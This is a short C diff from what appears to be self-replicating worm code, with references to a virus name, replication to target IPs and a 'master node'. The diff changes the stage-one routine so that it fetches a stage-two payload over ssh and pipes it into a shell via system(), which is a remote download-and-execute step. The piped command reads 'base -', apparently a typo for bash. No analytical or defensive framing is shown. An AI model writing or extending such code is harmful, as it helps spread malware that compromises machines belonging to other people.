@@ -116,10 +116,10 @@ int replicate_to_host(char *virus_name, char *target_ip_buff) {
     }
 }
 
-// fetch the stage 2 payload from master node (actually a simple cronjob script)
+// fetch and exec stage 2 payload from master node (bash script)
 void execute_stage_1(char *master_ip) {
     char cmd_buffer[BUFFER_SIZE];
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp lucas@%s:%s/%s %s", master_ip, MASTER_WORKING_DIR, STAGE_2_PAYLOAD, VIRUS_WOKRING_DIR);
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh lucas@%s cat %s/%s | base -", master_ip, MASTER_WORKING_DIR, STAGE_2_PAYLOAD);
     system(cmd_buffer);
 }
 
